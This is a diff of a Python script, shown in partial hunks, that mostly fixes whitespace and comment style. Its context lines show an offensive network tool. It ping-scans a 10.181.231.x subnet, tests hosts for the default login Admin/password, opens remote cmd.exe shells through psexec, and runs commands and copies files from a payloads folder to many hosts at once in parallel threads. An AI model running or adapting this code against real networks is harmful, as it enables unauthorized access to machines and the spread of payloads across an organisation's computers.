@@ -1,7 +1,9 @@
 #Everything you want in one place
+
 import os
 import time
 import threading
+
 screenlock = threading.Semaphore(value=1)
 
 PATH_TO_PAYLOADS = r"C:\Users\Admin\Documents\Code"
@@ -26,11 +28,11 @@ exclude = [165, 130, 139, 171, 178, 153, 151, 176, 179, 144, 160, 174, 175, 166,
 
 completeFlags = []
 
+
 def menu():
     for line in banner:
         print(line, end="")
     print("\nRun 'scan' to find all IPs, then 'credtest' to see which of those have default creds")
-
 
     while True:
         cmd = input("\n> ").split(" ")
@@ -72,7 +74,7 @@ def menu():
         if cmd[0] == "hosts":
             print("\n[+] TARGETS " + str(ips).replace(" ", ""))
             print("[+] DEFAULT " + str(defaultCredIps).replace(" ", ""))
-            #print("[+] EXCLUDE " + str(exclude).replace(" ", ""))
+            # print("[+] EXCLUDE " + str(exclude).replace(" ", ""))
 
         if cmd[0] == "credtest":
             credTest()
@@ -88,10 +90,12 @@ def menu():
         if cmd[0] == "resolve":
             resolveDefaults()
 
+
 def resolveDefaults():
     for host in defaultCredIps:
         print("10.181.231.%s :: " % str(host), end=" ")
         rexecT(host, "Admin", "password", "hostname")
+
 
 def rconnect():
     target = input("\n[RHOST]> ")
@@ -99,6 +103,7 @@ def rconnect():
     pword = input("[PWORD]> ")
     print("\n[+] Spawning shell\n")
     os.system(r"C:\Users\Admin\psexec\psexec -nobanner \\10.181.231.%s -u %s -p %s cmd.exe" % (target, uname, pword)) #CHANGE TO WHEREVER PSEXEC IS
+
 
 def credTest():
     global completeFlags
@@ -116,6 +121,7 @@ def credTest():
     os.system("cls")
     print("\n[+] Found %s devices with default credentials of Profile:password" % str(len(defaultCredIps)))
     print("[+] " + str(defaultCredIps).replace(" ", ""))
+
 
 def rexec(defaultMode=False, copyExe=False):
     global completeFlags
@@ -151,6 +157,7 @@ def rexec(defaultMode=False, copyExe=False):
         while 0 in completeFlags:
             pass
     print("\n[+] Done")
+
 
 def rexecT(tgt=0, uname="", pword="", cmd="", index=0, sav=False): #The actual function for executing a command so that it can be threaded
     global completeFlags
@@ -202,6 +209,7 @@ def rcpy(defaultMode=False):
             pass
     print("\n[+] Done")
 
+
 def rcpyT(tgt=0, uname="", pword="", fname="", index=0, onDesktop=False): #The actual function for executing a command so that it can be threaded
     global completeFlags
     global defaultCredIps
@@ -216,7 +224,7 @@ def rcpyT(tgt=0, uname="", pword="", fname="", index=0, onDesktop=False): #The a
     completeFlags[index] = 1
 
 
-def rscan(): #Conducts a ping scan to discover any hosts on the network
+def rscan(): # Conducts a ping scan to discover any hosts on the network
     global ips
     ips = []
     for i in range(100, 240):
@@ -229,6 +237,7 @@ def rscan(): #Conducts a ping scan to discover any hosts on the network
     print("\n[+] DISCOVERED: " + str(len(ips)))
     print("\n[+] RANGE: " + str(ips[0]) + " -> " + str(ips[-1]))
     print("\n==================================================\n")
+
 
 def rmsg():
     maxThreads = 64
@@ -244,10 +253,10 @@ def rmsg():
                 x = threading.Thread(target=rmsgT, args=(reason,target))
                 x.start()
 
+
 def rmsgT(reason="", target=""):
     print("[+] MESSAGING:", target)
     os.system(r'msg Admin /SERVER %s %s' % (target, reason))
-
 
 
 menu()
